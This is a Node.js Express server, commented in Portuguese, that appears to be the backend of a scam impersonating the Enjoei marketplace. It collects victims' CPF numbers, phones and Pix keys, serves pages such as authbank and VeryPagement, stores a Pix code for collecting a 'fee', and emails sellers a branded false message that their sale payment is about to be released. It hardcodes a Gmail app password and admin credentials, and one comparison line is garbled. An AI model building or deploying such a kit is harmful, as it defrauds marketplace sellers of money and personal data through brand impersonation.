const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');
const multer = require('multer');
const jwt = require('jsonwebtoken');
const sqlite3 = require('sqlite3').verbose(); // Importar o SQLite

const app = express();
const PORT = process.env.PORT || 3000;
const JWT_SECRET = 'sua_chave_secreta_aqui';

// Conexão com o banco de dados SQLite
const db = new sqlite3.Database('./enjoei.db', (err) => {
    if (err) {
        console.error('Erro ao conectar ao SQLite:', err.message);
    } else {
        console.log('Conectado ao SQLite');
    }
});

// Criar tabelas no SQLite (equivalente aos esquemas do Mongoose)
db.serialize(() => {
    // Tabela para Clientes
    db.run(`
        CREATE TABLE IF NOT EXISTS clients (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            nome TEXT NOT NULL,
            cpf TEXT,
            telefone TEXT,
            chavePix TEXT,
            status TEXT,
            ultimoPagamento TEXT
        )
    `);

    // Tabela para Configurações de Pagamento (apenas uma linha)
    db.run(`
        CREATE TABLE IF NOT EXISTS paymentSettings (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            qrCode TEXT,
            pixCopyPaste TEXT
        )
    `);

    // Inserir configurações padrão se a tabela estiver vazia
    db.get('SELECT COUNT(*) as count FROM paymentSettings', (err, row) => {
        if (err) {
            console.error('Erro ao verificar paymentSettings:', err.message);
            return;
        }
        if (row.count === 0) {
            db.run(`
                INSERT INTO paymentSettings (qrCode, pixCopyPaste)
                VALUES (?, ?)
            `, ['../img/qrcode.jpg', '00020126850014br.gov.bcb.pix2563pix.voluti.com.br/qr/v3/at/e090cf24-506a-4905-865b-30fbd4d833c85204000053039865802BR5925PAGFACIL_MEIOS_DE_PAGAMEN6005SINOP62070503***63043678']);
        }
    });
});

// Middleware
app.use(cors());
app.use(bodyParser.json());

// Configuração de upload de imagens com multer
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, 'uploads/');
    },
    filename: (req, file, cb) => {
        cb(null, Date.now() + path.extname(file.originalname));
    },
});
const upload = multer({ storage });

// Certifique-se de que a pasta 'uploads' exista
const fs = require('fs');
if (!fs.existsSync('uploads')) {
    fs.mkdirSync('uploads');
}

// Servir arquivos estáticos
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));
app.use('/acesso', express.static(path.join(__dirname, 'acesso')));
app.use('/api', express.static(path.join(__dirname, 'api')));
app.use('/authbank', express.static(path.join(__dirname, 'authbank')));
app.use('/authpay', express.static(path.join(__dirname, 'authpay')));
app.use('/confirm', express.static(path.join(__dirname, 'confirm')));
app.use('/inicial', express.static(path.join(__dirname, 'inicial')));
app.use('/pay', express.static(path.join(__dirname, 'pay')));
app.use('/payvery', express.static(path.join(__dirname, 'payvery')));
app.use('/very', express.static(path.join(__dirname, 'very')));
app.use('/VeryPagement', express.static(path.join(__dirname, 'VeryPagement')));
app.use('/adm', express.static(path.join(__dirname, 'adm')));
app.use(express.static(path.join(__dirname, 'inicial')));

// Rotas específicas para admin e login
app.get('/admin', (req, res) => {
    const filePath = path.join(__dirname, 'adm', 'admin.html');
    res.sendFile(filePath, (err) => {
        if (err) {
            console.error('Erro ao servir admin.html:', err);
            res.status(404).send('admin.html não encontrado na pasta adm');
        }
    });
});

app.get('/login', (req, res) => {
    const filePath = path.join(__dirname, 'adm', 'login.html');
    res.sendFile(filePath, (err) => {
        if (err) {
            console.error('Erro ao servir login.html:', err);
            res.status(404).send('login.html não encontrado na pasta adm');
        }
    });
});

// Rota raiz
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'inicial', 'index.html'));
});

// Middleware para autenticação
const authenticateToken = (req, res, next) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];

    if (!token) {
        return res.status(401).json({ error: 'Acesso negado: token não fornecido' });
    }

    jwt.verify(token, JWT_SECRET, (err, user) => {
        if (err) {
            return res.status(403).json({ error: 'Acesso negado: token inválido' });
        }
        req.user = user;
        next();
    });
};

// Rota de login (simples, para gerar token)
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    if (username === 'admin' && password === 'senha123') {
        const token = jwt.sign({ username }, JWT_SECRET, { expiresIn: '1h' });
        res.json({ token });
    } else {
        res.status(401).json({ error: 'Credenciais inválidas' });
    }
});

// Endpoints da API para gerenciar clientes (protegidos)
app.get('/api/clients', authenticateToken, (req, res) => {
    db.all('SELECT * FROM clients', [], (err, rows) => {
        if (err) {
            console.error('Erro ao obter clientes:', err.message);
            return res.status(500).json({ error: 'Erro ao obter clientes' });
        }
        res.json(rows);
    });
});

app.post('/api/clients', authenticateToken, (req, res) => {
    const { nome, cpf, telefone, chavePix, status, ultimoPagamento } = req.body;
    if (!nome) {
        return res.status(400).json({ error: 'O nome é obrigatório' });
    }

    db.get('SELECT MAX(id) as maxId FROM clients', (err, row) => {
        if (err) {
            console.error('Erro ao obter o último ID:', err.message);
            return res.status(500).json({ error: 'Erro ao adicionar cliente' });
        }

        const newId = (row.maxId || 0) + 1;
        db.run(
            'INSERT INTO clients (id, nome, cpf, telefone, chavePix, status, ultimoPagamento) VALUES (?, ?, ?, ?, ?, ?, ?)',
            [newId, nome, cpf, telefone, chavePix, status, ultimoPagamento],
            function (err) {
                if (err) {
                    console.error('Erro ao adicionar cliente:', err.message);
                    return res.status(500).json({ error: 'Erro ao adicionar cliente' });
                }
                res.status(201).json({ id: newId, nome, cpf, telefone, chavePix, status, ultimoPagamento });
            }
        );
    });
});

app.put('/api/clients/:id', authenticateToken, (req, res) => {
    const id = parseInt(req.params.id);
    const { nome, cpf, telefone, chavePix, status, ultimoPagamento } = req.body;

    if (!nome) {
        return res.status(400).json({ error: 'O nome é obrigatório' });
    }

    db.run(
        'UPDATE clients SET nome = ?, cpf = ?, telefone = ?, chavePix = ?, status = ?, ultimoPagamento = ? WHERE id = ?',
        [nome, cpf, telefone, chavePix, status, ultimoPagamento, id],
        function (err) {
            if (err) {
                console.error('Erro ao atualizar cliente:', err.message);
                return res.status(500).json({ error: 'Erro ao atualizar cliente' });
            }
            if (this.changes === 0(secret)) {
                return res.status(404).json({ error: 'Cliente não encontrado' });
            }
            res.json({ id, nome, cpf, telefone, chavePix, status, ultimoPagamento });
        }
    );
});

app.delete('/api/clients/:id', authenticateToken, (req, res) => {
    const id = parseInt(req.params.id);

    db.run('DELETE FROM clients WHERE id = ?', [id], function (err) {
        if (err) {
            console.error('Erro ao excluir cliente:', err.message);
            return res.status(500).json({ error: 'Erro ao excluir cliente' });
        }
        if (this.changes === 0) {
            return res.status(404).json({ error: 'Cliente não encontrado' });
        }
        res.status(204).send();
    });
});

// Endpoints da API para configurações de pagamento (protegidos)
app.get('/api/payment-settings', authenticateToken, (req, res) => {
    db.get('SELECT * FROM paymentSettings LIMIT 1', (err, row) => {
        if (err) {
            console.error('Erro ao obter configurações de pagamento:', err.message);
            return res.status(500).json({ error: 'Erro ao obter configurações de pagamento' });
        }
        res.json(row || { qrCode: '../img/qrcode.jpg', pixCopyPaste: '' });
    });
});

app.post('/api/payment-settings', authenticateToken, upload.single('qrCode'), (req, res) => {
    const { pixCopyPaste } = req.body;
    const qrCode = req.file ? `/uploads/${req.file.filename}` : null;

    db.get('SELECT * FROM paymentSettings LIMIT 1', (err, row) => {
        if (err) {
            console.error('Erro ao verificar configurações de pagamento:', err.message);
            return res.status(500).json({ error: 'Erro ao atualizar configurações de pagamento' });
        }

        const updateData = {
            qrCode: qrCode || (row ? row.qrCode : '../img/qrcode.jpg'),
            pixCopyPaste: pixCopyPaste || (row ? row.pixCopyPaste : '')
        };

        if (row) {
            // Atualizar configurações existentes
            db.run(
                'UPDATE paymentSettings SET qrCode = ?, pixCopyPaste = ? WHERE id = ?',
                [updateData.qrCode, updateData.pixCopyPaste, row.id],
                (err) => {
                    if (err) {
                        console.error('Erro ao atualizar configurações de pagamento:', err.message);
                        return res.status(500).json({ error: 'Erro ao atualizar configurações de pagamento' });
                    }
                    res.json(updateData);
                }
            );
        } else {
            // Inserir novas configurações
            db.run(
                'INSERT INTO paymentSettings (qrCode, pixCopyPaste) VALUES (?, ?)',
                [updateData.qrCode, updateData.pixCopyPaste],
                (err) => {
                    if (err) {
                        console.error('Erro ao inserir configurações de pagamento:', err.message);
                        return res.status(500).json({ error: 'Erro ao atualizar configurações de pagamento' });
                    }
                    res.json({ ...updateData, id: this.lastID });
                }
            );
        }
    });
});

// Configuração do transportador de e-mail
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'vendasenjoei427@gmail.com',
        pass: 'lrvd jewr hmae ceqi'
    }
});

// Rota para envio de e-mail
app.post('/enviar-email', async (req, res) => {
    const { email } = req.body;

    const mailOptions = {
        from: 'Enjoei <vendasenjoei427@gmail.com>',
        to: email,
        subject: 'Pagamento confirmado! 💰',
        html: `
            <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; line-height: 1.6; color: #333; background-color: #f9f9f9; border-radius: 10px;">
                <div style="text-align: center; padding: 20px; background-color: #800080; border-radius: 10px 10px 0 0;">
                    <h1 style="color: #fff; margin: 0; font-size: 28px;">Parabéns pela sua venda! 🎉</h1>
                </div>
                <div style="padding: 20px; background-color: #fff; border-radius: 0 0 10px 10px;">
                    <p style="font-size: 16px; margin: 0 0 15px;">Olá,</p>
                    <p style="font-size: 16px; margin: 0 0 15px;">Temos uma ótima notícia! Todas as etapas para o recebimento do valor da sua venda foram concluídas com sucesso. 💰</p>
                    <p style="font-size: 16px; margin: 0 0 15px;">No momento, estamos finalizando a análise dos detalhes do pagamento da taxa. <strong>Fique de olho!</strong> Em breve, você receberá uma confirmação por <strong>e-mail, SMS ou ligação</strong> avisando que o valor já está na sua conta.</p>
                    <p style="font-size: 16px; margin: 0 0 15px;">Enquanto isso, prepare-se para ser redirecionado para uma rápida pesquisa de satisfação. Sua opinião é muito importante para nós! 😊</p>
                    <div style="text-align: center; margin: 20px 0;">
                        <a href="#" style="display: inline-block; padding: 10px 20px; background-color: #800080; color: #fff; text-decoration: none; border-radius: 5px; font-size: 16px;">Acompanhe seu pagamento</a>
                    </div>
                    <hr style="border: 0; border-top: 1px solid #eee; margin: 20px 0;" />
                    <p style="font-size: 12px; color: #888; text-align: center;">Este é um e-mail automático, por favor, não responda diretamente. Se precisar de ajuda, entre em contato com nossa equipe em <a href="mailto:suporte@enjoei.com" style="color: #800080;">suporte@enjoei.com</a>.</p>
                    <p style="font-size: 12px; color: #888; text-align: center;">Enjoei - Grito da moda! 💜</p>
                </div>
            </div>
        `
    };

    try {
        const info = await transporter.sendMail(mailOptions);
        console.log('E-mail enviado:', info.response);
        res.send('E-mail enviado com sucesso!');
    } catch (error) {
        console.error('Erro ao enviar e-mail:', error);
        res.status(500).send('Erro ao enviar e-mail');
    }
});

// Capturar erros 404
app.use((req, res) => {
    res.status(404).send('404: Página não encontrada');
});

// Iniciar o servidor
app.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}`);
});

// Fechar o banco de dados quando o servidor for encerrado
process.on('SIGINT', () => {
    db.close((err) => {
        if (err) {
            console.error('Erro ao fechar o banco de dados:', err.message);
        }
        console.log('Conexão com SQLite fechada');
        process.exit(0);
    });
});